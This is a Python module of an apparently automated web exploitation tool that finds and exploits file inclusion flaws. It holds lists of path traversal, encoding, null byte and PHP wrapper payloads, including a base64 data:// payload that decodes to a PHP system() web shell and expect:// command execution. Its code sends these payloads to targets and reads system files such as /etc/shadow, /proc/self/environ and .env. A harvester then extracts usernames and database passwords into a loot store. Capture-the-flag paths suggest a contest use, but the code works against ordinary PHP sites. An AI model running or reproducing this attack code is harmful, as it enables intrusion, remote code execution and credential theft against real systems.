"""
EnoughOfWeb — Local File Inclusion / Remote File Inclusion Module
Covers: path traversal, PHP wrappers, null byte, double encoding.
"""

import re
import base64
from typing import List, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote

from modules.base import BaseExploit, Finding, ExploitResult, Severity
from core.loot_manager import LootManager


# ---------------------------------------------------------------------------
# Detection payloads
# ---------------------------------------------------------------------------

# Standard traversal payloads (Linux)
TRAVERSAL_LINUX = [
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\\....\\....\\....\\....\\etc\\passwd",
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%00.html",
    "../../../../../../etc/passwd%00.php",
    "/etc/passwd",
    "file:///etc/passwd",
    "....//....//....//etc/passwd",
    "..././..././..././..././etc/passwd",
    "..;/..;/..;/..;/..;/etc/passwd",
]

# Standard traversal payloads (Windows)
TRAVERSAL_WINDOWS = [
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../../../windows/win.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    "file:///C:/windows/win.ini",
]

# PHP wrappers
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../includes/config.php",
    "php://filter/convert.base64-encode/resource=../db.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    "data://text/plain,<?php system('cat /flag*');?>",
    "expect://id",
    "expect://cat /flag*",
    "php://filter/convert.base64-encode/resource=flag",
    "php://filter/convert.base64-encode/resource=flag.php",
    "php://filter/convert.base64-encode/resource=flag.txt",
    "php://filter/convert.base64-encode/resource=/flag",
    "php://filter/convert.base64-encode/resource=/flag.txt",
]

# Target files for exploitation
INTERESTING_FILES_LINUX = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/.env",
    "../.env",
    "/flag",
    "/flag.txt",
    "/home/flag.txt",
    "/root/flag.txt",
    "/app/flag.txt",
    "/var/www/flag.txt",
    "/opt/flag.txt",
    "/tmp/flag.txt",
]

INTERESTING_FILES_PHP = [
    "index.php",
    "config.php",
    "../config.php",
    "../includes/config.php",
    "../db.php",
    "../database.php",
    "../settings.php",
    "flag.php",
    "../flag.php",
    "../../flag.php",
    ".env",
    "../.env",
    "../../.env",
]

# Success indicators
LINUX_INDICATORS = [
    "root:x:0:0",
    "root:0:0",
    "daemon:",
    "/bin/bash",
    "/bin/sh",
    "/usr/sbin/nologin",
]

WINDOWS_INDICATORS = [
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
    "for 16-bit app support",
]

PHP_WRAPPER_INDICATORS = [
    "<?php",
    "<?=",
    "class ",
    "function ",
    "require",
    "include",
    "$_",
]


class LFIExploit(BaseExploit):
    name = "lfi"
    description = "Local/Remote File Inclusion — traversal, PHP wrappers, null byte, encoding"
    priority = 4

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []
        injection_points = self._gather_injection_points(target_url, recon_data)

        for point in injection_points:
            url = point["url"]
            param = point["param"]
            method = point["method"]
            base_data = point.get("base_data", {})

            finding = self._detect_lfi(url, param, method, base_data)
            if finding:
                findings.append(finding)

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            return self._exploit_lfi(finding)
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _gather_injection_points(self, target_url, recon_data):
        points = []
        seen = set()

        for p in recon_data.get("parameters", []):
            key = (p.get("url", target_url), p["name"])
            if key in seen:
                continue
            seen.add(key)
            method = "GET" if p.get("location", "url") == "url" else "POST"
            points.append({
                "url": p.get("url", target_url),
                "param": p["name"],
                "method": method,
                "base_data": {},
            })

        for form in recon_data.get("forms", []):
            form_url = urljoin(target_url, form.get("action", ""))
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", {})
            for input_name in inputs:
                key = (form_url, input_name)
                if key in seen:
                    continue
                seen.add(key)
                points.append({
                    "url": form_url,
                    "param": input_name,
                    "method": method,
                    "base_data": dict(inputs),
                })

        if not points:
            for p in ["file", "page", "path", "include", "doc", "document",
                       "folder", "root", "pg", "style", "template", "php_path",
                       "name", "cat", "dir", "action", "board", "lang",
                       "content", "read", "filePath", "load", "view"]:
                points.append({"url": target_url, "param": p, "method": "GET", "base_data": {}})

        return points

    def _send_payload(self, url, param, method, payload, base_data=None):
        data = dict(base_data) if base_data else {}
        
        def _do_send(p: str):
            try:
                if method == "GET":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[param] = [p]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    return self._request("GET", test_url)
                else:
                    req_data = dict(data)
                    req_data[param] = p
                    return self._request("POST", url, data=req_data)
            except Exception:
                return None

        resp, used_payload, was_mutated = self._send_with_waf_retry(
            send_fn=_do_send,
            payload=payload,
            context="lfi",
            target_url=url
        )
        return resp

    def _has_lfi_indicators(self, text: str) -> tuple:
        """Check if response contains LFI success indicators. Returns (bool, os_type, evidence)."""
        for indicator in LINUX_INDICATORS:
            if indicator in text:
                return True, "linux", indicator
        for indicator in WINDOWS_INDICATORS:
            if indicator.lower() in text.lower():
                return True, "windows", indicator
        return False, None, None

    def _has_php_source(self, text: str) -> bool:
        """Check if response contains PHP source code (from php://filter)."""
        for indicator in PHP_WRAPPER_INDICATORS:
            if indicator in text:
                return True
        return False

    def _detect_lfi(self, url, param, method, base_data) -> Optional[Finding]:
        # Get baseline to compare
        baseline = self._send_payload(url, param, method, "nonexistent_file_eow", base_data)
        baseline_len = len(baseline.text) if baseline else 0

        # Try Linux traversal
        for payload in TRAVERSAL_LINUX:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            success, os_type, evidence = self._has_lfi_indicators(resp.text)
            if success:
                self._harvest_loot(url, payload, resp.text)
                return Finding(
                    module=self.name,
                    vuln_type="lfi-traversal",
                    target_url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence=evidence,
                    severity=Severity.HIGH,
                    extra={"os": os_type, "base_data": base_data},
                )

            flag = self._check_flag(resp.text)
            if flag:
                return Finding(
                    module=self.name,
                    vuln_type="lfi-traversal",
                    target_url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence=f"Flag found: {flag}",
                    severity=Severity.CRITICAL,
                    extra={"os": "linux", "base_data": base_data, "flag": flag},
                )

        # Try Windows traversal
        for payload in TRAVERSAL_WINDOWS:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue
            success, os_type, evidence = self._has_lfi_indicators(resp.text)
            if success:
                return Finding(
                    module=self.name,
                    vuln_type="lfi-traversal",
                    target_url=url,
                    parameter=param,
                    method=method,
                    payload=payload,
                    evidence=evidence,
                    severity=Severity.HIGH,
                    extra={"os": os_type, "base_data": base_data},
                )

        # Try PHP wrappers
        for payload in PHP_WRAPPERS:
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            # Check for base64 encoded content
            if "convert.base64-encode" in payload:
                # Response should be significantly different and contain base64
                if abs(len(resp.text) - baseline_len) > 50:
                    b64_match = re.search(r"([A-Za-z0-9+/]{40,}={0,2})", resp.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="ignore")
                            lfi_ok, os_type, evidence = self._has_lfi_indicators(decoded)
                            if lfi_ok or self._has_php_source(decoded):
                                return Finding(
                                    module=self.name,
                                    vuln_type="lfi-php-wrapper",
                                    target_url=url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"Base64-decoded content: {decoded[:100]}",
                                    severity=Severity.HIGH,
                                    extra={"os": "linux", "base_data": base_data, "wrapper": "php_filter"},
                                )
                            flag = self._check_flag(decoded)
                            if flag:
                                return Finding(
                                    module=self.name,
                                    vuln_type="lfi-php-wrapper",
                                    target_url=url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"Flag in decoded content: {flag}",
                                    severity=Severity.CRITICAL,
                                    extra={"os": "linux", "base_data": base_data, "wrapper": "php_filter", "flag": flag},
                                )
                        except Exception:
                            pass

            # For non-base64 wrappers, check if response differs significantly
            elif abs(len(resp.text) - baseline_len) > 100:
                if self._has_php_source(resp.text):
                    return Finding(
                        module=self.name,
                        vuln_type="lfi-php-wrapper",
                        target_url=url,
                        parameter=param,
                        method=method,
                        payload=payload,
                        evidence="PHP source code visible in response",
                        severity=Severity.HIGH,
                        extra={"os": "linux", "base_data": base_data, "wrapper": payload.split("://")[0]},
                    )

        return None

    def _exploit_lfi(self, finding: Finding) -> ExploitResult:
        url = finding.target_url
        param = finding.parameter
        method = finding.method
        base_data = finding.extra.get("base_data", {})
        vuln_type = finding.vuln_type
        all_data = []

        # Check if a flag was already found during detection
        found_flag = finding.extra.get("flag")

        # Determine traversal prefix based on working payload
        traversal_prefix = self._get_traversal_prefix(finding.payload)

        # 1. Try flag files directly
        flag_files = [
            "/flag", "/flag.txt", "/flag.php",
            "/home/flag.txt", "/home/ctf/flag.txt",
            "/root/flag.txt", "/app/flag.txt",
            "/var/www/flag.txt", "/var/www/html/flag.txt",
            "/opt/flag.txt", "/tmp/flag.txt",
            "flag.txt", "flag.php", "flag",
            "../flag.txt", "../../flag.txt",
            "../../../flag.txt",
        ]

        for file_path in flag_files:
            if file_path.startswith("/"):
                payload = traversal_prefix + file_path
            else:
                payload = file_path

            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=payload,
                    technique=vuln_type, raw_response=resp.text[:2000],
                )

        # 2. Try PHP wrapper for flag files
        if vuln_type == "lfi-php-wrapper" or "php" in finding.payload:
            php_flag_payloads = [
                "php://filter/convert.base64-encode/resource=flag",
                "php://filter/convert.base64-encode/resource=flag.php",
                "php://filter/convert.base64-encode/resource=flag.txt",
                "php://filter/convert.base64-encode/resource=/flag",
                "php://filter/convert.base64-encode/resource=/flag.txt",
                "php://filter/convert.base64-encode/resource=../flag",
                "php://filter/convert.base64-encode/resource=../flag.txt",
                "php://filter/convert.base64-encode/resource=../../flag.txt",
                "php://filter/convert.base64-encode/resource=config",
                "php://filter/convert.base64-encode/resource=config.php",
                "php://filter/convert.base64-encode/resource=../config.php",
                "php://filter/convert.base64-encode/resource=.env",
                "php://filter/convert.base64-encode/resource=../.env",
            ]
            for payload in php_flag_payloads:
                resp = self._send_payload(url, param, method, payload, base_data)
                if resp is None:
                    continue
                decoded = self._decode_php_filter_response(resp.text)
                if decoded:
                    all_data.append(f"[{payload}]: {decoded[:500]}")
                    
                    # Loot Harvesting
                    self._harvest_loot(url, payload, decoded)
                    
                    flag = self._check_flag(decoded)
                    if flag:
                        return ExploitResult(
                            success=True, flag=flag, payload_used=payload,
                            technique="lfi-php-filter", data_extracted=decoded,
                        )

        # 3. Read interesting system files for more data
        for file_path in INTERESTING_FILES_LINUX:
            payload = traversal_prefix + file_path
            resp = self._send_payload(url, param, method, payload, base_data)
            if resp is None:
                continue

            # Loot Harvesting BEFORE returning
            if any(ind in resp.text for ind in LINUX_INDICATORS + ["FLAG", "flag", "secret"]):
                all_data.append(f"[{file_path}]: {resp.text[:500]}")
                self._harvest_loot(url, file_path, resp.text)

            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=payload,
                    technique=vuln_type, raw_response=resp.text[:2000],
                )

        # 4. Try /proc/self/environ for env vars
        environ_payload = traversal_prefix + "/proc/self/environ"
        resp = self._send_payload(url, param, method, environ_payload, base_data)
        if resp:
            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True, flag=flag, payload_used=environ_payload,
                    technique="lfi-environ",
                )
            if "PATH=" in resp.text or "HOME=" in resp.text:
                all_data.append(f"[/proc/self/environ]: {resp.text[:500]}")
                self._harvest_loot(url, "/proc/self/environ", resp.text)

        if all_data:
            combined = "\n---\n".join(all_data)
            flag = self._check_flag(combined) or found_flag
            return ExploitResult(
                success=True, flag=flag, data_extracted=combined,
                technique=vuln_type,
            )

        if found_flag:
            return ExploitResult(success=True, flag=found_flag, payload_used=finding.payload, technique=vuln_type)
            
        return ExploitResult(success=False, error="LFI exploitation did not yield flag")

    def _harvest_loot(self, target_url: str, file_path: str, content: str):
        """Parse text for credentials and save to LootManager."""
        loot = LootManager()
        
        # 1. /etc/passwd format (username:x:1000:1000...)
        if "root:x:0:0" in content or "/etc/passwd" in file_path:
            print(f"[*] LootManager: Checking /etc/passwd format in {file_path}")
            for line in content.splitlines():
                parts = line.split(":")
                if len(parts) >= 7:
                    user = parts[0]
                    # We might not have the password here, but we can store the username
                    if user not in ["sync", "games", "man", "lp", "mail", "news", "uucp", "proxy", "www-data", "backup", "list", "irc", "gnats", "nobody", "systemd-network", "systemd-resolve", "syslog", "messagebus", "_apt", "uuidd", "tcpdump", "sshd", "pollinate"]:
                        print(f"[*] LootManager: Found user: {user}")
                        loot.add_credential(target_url, user, "<found_user>", "lfi_passwd")
        
        # 2. .env format (DB_USER=root, DB_PASSWORD=secret)
        if "DB_PASSWORD" in content or "PASSWORD=" in content or ".env" in file_path:
            print(f"[*] LootManager: Checking .env format in {file_path}")
            env_vars = {}
            for line in content.splitlines():
                if "=" in line:
                    k, v = line.split("=", 1)
                    env_vars[k.strip()] = v.strip().strip("'\"")
            
            # Try to pair username and password
            user = env_vars.get("DB_USER") or env_vars.get("DB_USERNAME") or env_vars.get("USER")
            password = env_vars.get("DB_PASSWORD") or env_vars.get("DB_PASS") or env_vars.get("PASSWORD") or env_vars.get("PASS")
            
            if user and password:
                loot.add_credential(target_url, user, password, "lfi_env")
            elif password:
                loot.add_credential(target_url, "admin", password, "lfi_env_pass_only")

    def _get_traversal_prefix(self, working_payload: str) -> str:
        """Extract the traversal prefix (../../..) from a working payload."""
        # Count ../ occurrences
        match = re.match(r"((?:\.\./|\.\.\\|\.\.%2[fF]|%2[eE]%2[eE]%2[fF]|\.\.%252[fF]|\.\.\.\.//)+)", working_payload)
        if match:
            return match.group(1)
        if working_payload.startswith(".."):
            idx = working_payload.rfind("etc/passwd")
            if idx == -1:
                idx = working_payload.rfind("windows")
            if idx > 0:
                return working_payload[:idx]
        return "../../../../../../"

    def _decode_php_filter_response(self, text: str) -> Optional[str]:
        """Extract and decode base64 from php://filter response."""
        # Find base64 strings in response
        b64_matches = re.findall(r"([A-Za-z0-9+/]{20,}={0,2})", text)
        for b64_str in b64_matches:
            try:
                decoded = base64.b64decode(b64_str).decode("utf-8", errors="ignore")
                if len(decoded) > 5 and any(c.isalpha() for c in decoded):
                    return decoded
            except Exception:
                continue
        return None
